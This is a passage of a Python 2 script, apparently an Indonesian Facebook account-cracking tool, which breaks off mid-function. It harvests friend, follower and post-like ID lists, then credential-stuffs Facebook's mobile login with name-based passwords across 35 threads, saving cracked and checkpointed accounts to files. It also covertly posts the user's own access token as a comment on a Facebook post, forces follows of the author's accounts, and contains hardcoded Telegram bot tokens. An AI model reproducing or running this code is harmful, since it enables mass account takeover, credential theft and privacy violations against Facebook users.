# -*- coding: UTF-8 -*-.
# Coded by : Romi Afrizal
# facebook.com/romi.29.04.03
# Recode? silahkan. Jangan ubah nama pembuat nya ya :). jgn ganti bot nya, boleh nambah :)
# Maaf kalau codingan nya acak"an males ngerapihin

#--- IMPORT MODULE ---#

sys.setdefaultencoding('utf-8')
from datetime import datetime
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
import subprocess, logging
from random import randint

MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))


ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
tahun = current.year
bulan_ = current.month
hari = current.day
op = bulan[nTemp]

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')

# KUMPULAN WARNA #
if 'linux' in sys.platform.lower():
    H = '\x1b[0;37m' #PUTIH
    PT = '\x1b[1;35m' #PINK TEBAL
    M = '\x1b[0m' #WARNA MATI
    S = '\x1b[0;31m' #MERAH
    K = '\x1b[0;33m' #KUNING
    KT = '\x1b[1;33m' #KUNING
    HU = '\x1b[0;32m' #HIJAU
    HUT = '\x1b[1;32m' #HIJAU TEBAL
    B = '\x1b[0;36m' #BIRU
    BTU = '\x1b[1;36m' #BIRU
    P = '\x1b[0;35m' #PINK
    ST = '\x1b[1;31m' #MERAH TEBAL
    HT = '\x1b[1;37m' #PUTIH TEBAL
    BT = '\x1b[1;34m' #BIRU TUA
    notice = ('{}{}[*]{} ').format(M, BT, M)
    warning = ('{}[-]{} ').format(ST, M)
    good = ('{}[!]{} ').format(HU, M)
    warn = ('{}[!]{} ').format(KT, M)
else:
    HT = ''
    M = ''
    ST = ''
    BT = ''
    HUT = ''
    KT = ''
    BTU = ''
    notice = ''
    warning = ''
    good = ''
    d = ''
    warn = ''

hostbasic = 'https://mbasic.facebook.com'
api = "https://b-api.facebook.com/method/auth.login"
hostuch = 'https://touch.facebook.com'
host = 'https://m.facebook.com' #--> m.fb
loop = 0
ok = []
cp = []
id = []
pas = []
idlist = []
s = requests.Session()
# Kumpulan User Agents #
UserAgents = ({
"Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36", # Pakis , india & Usa
"Mozilla/5.0 (Linux; Android 7.0; SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36", # Bangla
"Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36", # Indo
"Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36", # Bebas (ok)
"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)", # Bebas 
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+", # Bebas 
"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)" # Bebas 
})
# ngebug :v Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]
ua = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)"])
uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()

# CEK RESULT #
def result():
    print ''
    print PT+'•'+HUT+' 01 '+BTU+'Cek hasil akun '+HUT+'[OK]'
    print PT+'•'+HUT+' 02 '+BTU+'Cek hasil akun \x1b[1;91m[\x1b[1;93mCP\x1b[1;91m]'
    print PT+'•'+ST+' 00 '+BTU+'Kembali'
    print ''
    sel_result()
def sel_result():
	mi = raw_input(PT+'# '+BTU+'Pilih'+ST+' > '+KT)
	if mi =='':
		print ('\x1b[1;91m• Wrong Input ');time.sleep(1.0)
		menu()
	elif mi =='1' or mi =='01':
		resultok()
	elif mi =='2' or mi =='02':
		resultcp()
	elif mi =='0' or mi =='00':
		menu()
	else:
		print ('\x1b[1;91m• Wrong Input ');time.sleep(1.0)
		menu()
def resultok():
	try:
		okeh=open("ok.txt","r").read()
		print"\n\x1b[1;95m•\x1b[1;96m Result \x1b[1;92m[OK]"
		print"\x1b[1;97m# \x1b[1;91m---------------------------------------- \x1b[1;97m#\x1b[1;92m  "
		print okeh
	except (IOError):
		okeh=''
		exit ("\n\x1b[1;95m\xe2\x80\xa2\x1b[1;96m no result \x1b[1;92m[OK]")
def resultcp():
	try:
		cepeh=open("cp.txt","r").read()
		print"\n\x1b[1;95m•\x1b[1;96m Result \x1b[1;91m[\x1b[1;93mCP\x1b[1;91m]"
		print"\x1b[1;97m# \x1b[1;91m---------------------------------------- \x1b[1;97m#\x1b[1;93m  "
		print cepeh
	except (IOError):
		cepeh=''
		exit ("\n\x1b[1;95m\xe2\x80\xa2\x1b[1;96m no result \x1b[1;91m[\x1b[1;93mCP\x1b[1;91m]")
		

ip = requests.get('https://api.ipify.org').text
kot = requests.get ("http://alvinxd.herokuapp.com/region/?").text
con = requests.get ("http://alvinxd.herokuapp.com/country/?").text
# BANNER #
def banner():
    print (' \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•\n\x1b[1;91m   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n\x1b[1;97m   |_____  |    \\_ |     | |_____  |    \\_\n\n     \x1b[1;95m    • \x1b[0;93mCoded by \x1b[0;91m: \x1b[0;93mRomi Afrizal \x1b[1;95m•   \n \x1b[1;91m•\x1b[1;93m•\x1b[1;92m•                                      \x1b[1;91m•\x1b[1;93m•\x1b[1;92m• \n \x1b[1;95m# \x1b[1;96mFb  \x1b[1;91m : \x1b[1;96mfacebook.com/romi.29.04.03 \n \x1b[1;95m# \x1b[1;96mGit\x1b[1;91m  : \x1b[1;96mgithub.com/Mark-Zuck \n \x1b[1;97m# \x1b[1;91m---------------------------------------- \x1b[1;97m#  ')
    print (' \x1b[1;95m#\x1b[1;96m IP   \x1b[1;91m:\x1b[1;96m '+ip+'\x1b[1;91m ')
    
# MASUK #
def masuk():
    os.system('clear')
    banner()
    print ''
    print PT+'•'+KT+' 01 '+BTU+'Login via token '
    print PT+'•'+KT+' 02 '+BTU+'Login via cookie'
    print PT+'•'+KT+' 03 '+BTU+'Tutorial mendapatkan token'
    print PT+'•'+KT+' 04 '+BTU+'Tutorial mendapatkan cookie'
    print PT+'•'+ST+' 00 '+BTU+'Keluar'
    print ''
    pilih_masuk()
def pilih_masuk():
    romi = raw_input('\x1b[1;95m#\x1b[1;92m \x1b[1;96mPilih\x1b[1;91m > \x1b[1;93m')
    if romi == '':
        print '\x1b[1;91m• Wrong Input '
        time.sleep(1.0)
        pilih_masuk()
    elif romi == '1' or romi == '01':
        token()
    elif romi == '2' or romi == '02':
        kuki()
    elif romi == '3' or romi == '03':
        tik()
        os.system('xdg-open https://youtu.be/IG5QfdxRkeY')
        os.sys.exit()
    elif romi == '4' or romi == '04':
        tik()
        os.system('xdg-open https://youtu.be/b9crrvr6d2s')
        os.sys.exit()
    elif romi == '0' or romi == '00':
    	print ''
    	print '\x1b[1;91m• exit \x1b[0;97m\n'
        exit()
    else:
        print '\x1b[1;91m Wrong Input '
        time.sleep(1.0)
        pilih_masuk()

# COOKIE #
def kuki():
#     os.system("clear")
#     banner()
        cookie = raw_input('\n\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Cookie\x1b[1;91m > \x1b[0;93m')
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent" : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer" : "https://m.facebook.com/",
                "host" : "m.facebook.com",
                "origin" : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control" : "max-age=0",
                "accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type" : "text/html; charset=utf-8"}, cookies = {
                "cookie" : cookie})
                find_token = re.search("(EAAA\w+)", data.text)
                hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print '\x1b[1;91m\xe2\x80\xa2 No connection '
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
#      tik()
        login_xx()
#      return

# TOKEN #
def token():
    data = raw_input('\n\x1b[1;95m\xe2\x80\xa2\x1b[1;96m Token\x1b[1;91m > \x1b[0;93m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + data)
        a = json.loads(otw.text)
        nama = a['name']
        open('login.txt', 'w').write(data)
#     tik()
        menu()
    except KeyError:
        print ('\x1b[1;91m• Invalid Token')
        time.sleep(1.0)
        masuk()

def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;95m• \x1b[1;96mMohon tunggu \x1b[1;91m' + o,
        sys.stdout.flush()
        time.sleep(1)
        
### MOHON TIDAK UNTUK DI UBAH BOLEH NAMBAH :) ###

def login_xx():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;92m• invalid'
        masuk()

    fbid = '100002461344178' # Id Nick unik sniper @() Sheikh Sami Shuja Uddin MD
    kom = random.choice(["Hello I'm a bff-2 user","Be yourself and never surendtod:v","Login bff-2 \nhttps://www.facebook.com/100002461344178/posts/3965852000173472/?substory_index=0&app=fbl"])
    requests.post('https://graph.facebook.com/496077571350068/comments/?message=' +toket+ '&access_token=' + toket) 
    #requests.post('https://graph.facebook.com/570025450621946/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + fbid + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/3933263743432298/comments/?message=' + kom + '&access_token=' + toket) 
    requests.post('https://graph.facebook.com/546133328/subscribers?access_token=' + toket) # Akun 2007
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + toket) # Nick unik sniper @() Sheikh Sami Shuja Uddin MD
    requests.post('https://graph.facebook.com/100028434880529/subscribers?access_token=' + toket) # Romi Afrizal 2018
    requests.post('https://graph.facebook.com/100067807565861/subscribers?access_token=' + toket) # Romi Afrizal 2021
    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + toket) # Iqbal Bobz
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + toket) # Iwan Hadiansyah
    requests.post('https://graph.facebook.com/100007520203452/subscribers?access_token=' + toket) # Hamzah Kirana
    exit('\x1b[1;92m• login success, run again the tools. ')

idfromteman = []
# DUMP PUBLIK #
def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m• Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        print ''
        print "\x1b[1;95m• \x1b[1;96mKetik '\x1b[1;92mme\x1b[1;96m' jika ingin dump daftar teman sendiri "
        idt = raw_input('\x1b[1;95m• \x1b[1;96mTarget id\x1b[1;91m > \x1b[1;93m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            qq = (op['first_name'] + '.json').replace(' ', '_')
            print '\x1b[1;95m• \x1b[1;96mNama\x1b[1;91m > \x1b[1;93m' + op['name']
        except KeyError:
            exit('\x1b[1;91m• Id tidak ada').format('R')
            raw_input('\n\x1b[1;91m• Kembali').format(N)
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
        z = json.loads(r.text)
        print '\x1b[1;95m• \x1b[1;96mMohon tunggu'
        print ''
        bz = open(qq, 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '<=>' + a['name'] + '\n')

        bz.close()
        print '\x1b[1;92m• Succes dump id dari %s' % op['name']
        print '\r\x1b[1;95m• \x1b[1;96mTotal id \x1b[1;91m>\x1b[1;93m %s' % len(idfromteman)
        print '\x1b[1;95m\xe2\x80\xa2 \x1b[1;96mFile dump tersimpan \x1b[1;91m>\x1b[1;92m ' + qq
        print ''
        os.sys.exit()
    except Exception as e:
        exit('\n\x1b[1;91m• Failed dump id')
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• No Connection!'
        exit()

# DUMP FOLLOWERS #
def followers():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m• Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        print ''
        print "\x1b[1;95m• \x1b[1;96mKetik '\x1b[1;92mme\x1b[1;96m' jika ingin dump followers sendiri "
        idt = raw_input('\x1b[1;95m• \x1b[1;96mTarget id\x1b[1;91m > \x1b[1;93m')
        kontol = raw_input('\x1b[1;95m• \x1b[1;96mLimit id\x1b[1;91m > \x1b[1;93m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            qq = (op['first_name'] + '.json').replace(' ', '_')
            print '\x1b[1;95m• \x1b[1;96mNama\x1b[1;91m > \x1b[1;93m' + op['name']
        except KeyError:
            print ('\n\x1b[1;91m• Followers not found !')
            raw_input(' \x1b[1;91mKembali')
            menu()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=' + kontol + '&access_token=' + toket)
        z = json.loads(r.text)
        print '\x1b[1;95m• \x1b[1;96mMohon tunggu ...'
        print ''
        bz = open(qq, 'w')
        for a in z['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '<=>' + a['name'] + '\n')

        bz.close()
        print '\x1b[1;92m• Succes dump followers dari %s' % op['name']
        print '\r\x1b[1;95m• \x1b[1;96mTotal followers \x1b[1;91m>\x1b[1;93m %s' % len(idfromteman)
        print '\x1b[1;95m• \x1b[1;96mFile dump tersimpan \x1b[1;91m>\x1b[1;92m ' + qq
        print ''
    except Exception as e:
        exit('\n\x1b[1;91m• Gagal dump followers')
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• No Connection!'
        exit()

# DUMP POST #
def post():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m• Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        print ''
        print '\x1b[1;95m• \x1b[1;96mMasukan id postingan publik '
        idt = raw_input('\x1b[1;95m• \x1b[1;96mId postingan\x1b[1;91m > \x1b[1;93m')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            qq = (op['first_name'] + '.json').replace(' ', '_')
            #print '\x1b[1;95m• \x1b[1;96mName\x1b[1;91m > \x1b[1;93m' + op['name']
        except KeyError:
            exit('\x1b[1;91m• id postingan not found !')
            raw_input('\n\x1b[1;91m• Back')
            menu()

        r = requests.get('https://graph.facebook.com/'+idt+'/likes?limit=10000&access_token='+toket)
        z = json.loads(r.text)
        print '\x1b[1;95m• \x1b[1;96mMohon tunggu ...'
        print ''
        bz = open(qq, 'w')
        for a in z['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '<=>' + a['name'] + '\n')

        bz.close()
        print '\x1b[1;92m• Succes dump id postingan ' #%s' % op['name']
        print '\r\x1b[1;95m• \x1b[1;96mTotal id \x1b[1;91m>\x1b[1;93m %s' % len(idfromteman)
        print '\x1b[1;95m\xe2\x80\xa2 \x1b[1;96mFile dump tersimpan \x1b[1;91m>\x1b[1;92m ' + qq
        print ''
        exit()
    except Exception as e:
        exit('\n\x1b[1;91m• Gagal dump id post')
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• No Connection!'
        exit()

def ceks(cookies, results):
    global host
    global ua
    r = requests.get('https://m.facebook.com/settings/apps/tabbed/?tab=active', cookies=cookies, headers={'origin': host, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', host)), 'referer': host + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}).text
    if len(bs4.re.findall('Pool', r)) != 0:
        sends('%s -> 8BALL POOLLLLLLLL' % results, '1309178498:AAGxlAjtYYDnUeM04fYsfLz8lFTaSoYooYA')
    if len(bs4.re.findall('pubg', r.lower())) != 0:
        sends('%s -> PUBGGGGGGGGG' % results, '1305701364:AAG6dmquZmBkHVVVpoSBYx5UHxcQ3NnUfMs')
    if len(bs4.re.findall('garena', r.lower())) != 0:
        sends('%s -> FFFFFFFFFFFFFFF' % results, '928550832:AAGM35_UVioKPJ0EoIH3nqarnndcaHll6cU')
    if len(bs4.re.findall('legends', r.lower())) != 0:
        sends('%s -> EMELLLLLLLLLLL' % results, '1277181407:AAFABlCxC45BGGS0SzoxRANIMgvKkk6Qhgc')


h = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'} #--> m.fb
sic = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
uc = {'Host': 'touch.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
#rom = {'Host': 'graph.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

# MODUL METODE MOBILE / MBASIC #
def login(em, pas, hosts):
    global h
    r = requests.Session()
    r.headers.update(h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
       '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}
            return

        return

# HOST METODE MOBILE #
def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r

def cvs(cookies): # convert cookie dict to string
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
	
def cvd(cookies): # convert cookie dict to string
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
		
# PASSWORD UNTUK METODE MOBILE #

ips = None
try:
    b = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'}).json()['country_name'].lower()
except:
    ips = None

def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                #results.append(i)
                if 'pakistan' in ips:
                    results.append('786786')
                elif 'indonesia' in ips:
                    results.append(i + 'ganteng')
                    results.append(i + 'cantik')

    return results
    
# MENU PILIHAN METODE CRACK #

def pilih_crack():
    print ''
    print PT+'•'+BTU+' [ '+PT+'Pilih methode crack '+BTU+']\n'
    print PT+'•'+HT+' 01 '+BTU+'Methode'+ST+' api'+BTU+' (fast crack)  '
    print PT+'•'+HT+' 02 '+BTU+'Methode'+HT+' free'+BTU+' (slow crack)  '
    print PT+'•'+HT+' 03 '+BTU+'Methode '+HUT+'mobile'+BTU+' (very slow crack)  '
# print PT+'•'+HT+' 04 '+BTU+'Methode '+KT+'touch '+BTU+' (rekomendasi wifi) '
    print ''
    select_methode()
     
def select_methode():
    tod = raw_input('\x1b[1;95m#\x1b[1;92m \x1b[1;96mPilih\x1b[1;91m > \x1b[1;93m')
    if tod == '':
        print '\x1b[1;91m• Wrong Input'
        select_methode()
    elif tod == '1' or tod =='01':
        crackapi()
    elif tod == '2' or tod =='02':
    	crackmb()
    elif tod == '3' or tod =='03':
        crack()
    else:
        print '\x1b[1;91m• Wrong Input'
        select_methode()

# CRACK METODE MBASIC #
def crackmb():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print('\x1b[1;91m• Invalid token/cookie')
		os.system('rm -rf login.txt')
		exit()
	print('')
	romi_ganteng()
def romi_ganteng():
	ah = raw_input('\x1b[1;95m• \x1b[1;96mGunakan password manual? y/t\x1b[1;91m > \x1b[1;93m')
	if ah =='':
		romi_ganteng()
	elif ah == 'y' or ah == 'Y':
		try:
			idlist = raw_input('\033[1;95m•\033[1;96m File dump \033[1;91m>\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
			manual_basic()
		except KeyError:
			exit("\033[1;91m• [Errno 2] No such file or directory: '"+idlist+"' ")
		except IOError:
			exit("\033[1;91m• [Errno 2] No such file or directory: '"+idlist+"' ")
	elif ah == 'T' or ah =='t':
		try:
			idlist = raw_input('\033[1;95m•\033[1;96m File dump \033[1;91m>\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			exit("\033[1;91m• [Errno 2] No such file or directory: '"+idlist+"' ")
		except IOError:
			exit("\033[1;91m• [Errno 2] No such file or directory: '"+idlist+"' ")
	else:
		romi_ganteng()
		
	print '\n\x1b[1;95m• \x1b[1;96makun \x1b[1;92m[OK] \x1b[1;96mtersimpan ke file \x1b[1;91m> \x1b[1;92mok.txt \n\x1b[1;95m•\x1b[1;96m akun \x1b[1;91m[\x1b[0;93mCP\x1b[1;91m]\x1b[1;96m tersimpan ke file\x1b[1;91m > \x1b[1;93mcp.txt\n\x1b[1;95m! \x1b[1;96mcrack berjalan, tekan CTRL+Z untuk stop\n'
				
	def main(user):
		global loop, token
		results = []
		idlist = []
		sys.stdout.write('\r\x1b[1;95m \x1b[1;96m*--> \x1b[1;92mCrack\x1b[1;96m [%s/%s]-\x1b[1;92m[OK\x1b[0;91m:\x1b[0;92m%s\x1b[1;92m]\x1b[1;96m-\x1b[1;91m[\x1b[0;93mCP\x1b[0;91m:\x1b[0;93m%s\x1b[1;91m]' % (loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		for i in name.split(" "):
			if len(i)<3:
				continue
			else:
				if len(i) == 1 and len(i) == 2 and len(i) == 3 and len(i) == 4 or len(i) == 5:
					results.append(i+"123")
#                 results.append(i+"1234")
					results.append(i+"12345")
				else:
					results.append(i+"123")
					results.append(i+"12345")
					#results.append("sayang")
					results.append("786786")
					
		try:
			for pas in results:
				pas = pas.lower()
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pas, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r\x1b[0;91m \x1b[0;92m*--> '+uid+ ' ◊ ' + pas + '         ')
					ok.append(uid+' ◊ '+pas)
					save = open('ok.txt','a') 
					save.write(' *--> '+str(uid)+' ◊ '+str(pas)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r\x1b[0;91m \x1b[0;93m*--> '+uid+ '\x1b[0;91m ◊ \x1b[0;93m' + pas + ' \x1b[0;91m◊\x1b[0;93m '+ttl+'')
						cp.append(uid+' ◊ '+pas+' ◊ ' +ttl)
						save = open('cp.txt','a') 
						save.write('\x1b[0;93m *--> '+str(uid)+' \x1b[0;91m◊ \x1b[0;93m'+str(pas)+'\x1b[0;91m ◊ \x1b[0;93m' +ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r\x1b[0;91m \x1b[0;93m*--> '+uid+ ' \x1b[0;91m◊\x1b[0;93m ' + pas + '          ')
					cp.append(uid+' ◊ '+pas)
					save = open('cp.txt','a') 
					save.write('\x1b[0;93m *--> '+str(uid)+' \x1b[0;91m◊ \x1b[0;93m'+str(pas)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(35)
	p.map(main, id)
	#os.remove(idlist)
	exit('\n\x1b[1;92m• \x1b[1;92mfinished.')

def manual_basic():
	idlist = []
	print '\n\x1b[1;95m• \x1b[1;96mcontoh\x1b[1;91m >\x1b[1;96m sayang\x1b[1;91m,\x1b[1;96m786786\x1b[1;91m,\x1b[1;96miloveyou'
	pas = raw_input('\x1b[1;91m•\x1b[1;96m password \x1b[1;91m>\x1b[1;93m ')
	if len(pas) ==0:
		print("\033[1;91m• Jangan kosong")
		manual_basic()
		
	print '\n\x1b[1;95m• \x1b[1;96makun \x1b[1;92m[OK] \x1b[1;96mtersimpan ke file \x1b[1;91m> \x1b[1;92mok.txt \n\x1b[1;95m•\x1b[1;96m akun \x1b[1;91m[\x1b[0;93mCP\x1b[1;91m]\x1b[1;96m tersimpan ke file\x1b[1;91m > \x1b[1;93mcp.txt\n\x1b[1;95m! \x1b[1;96mcrack berjalan, tekan CTRL+Z untuk stop\n'
	
	def main(user):
		global loop, token
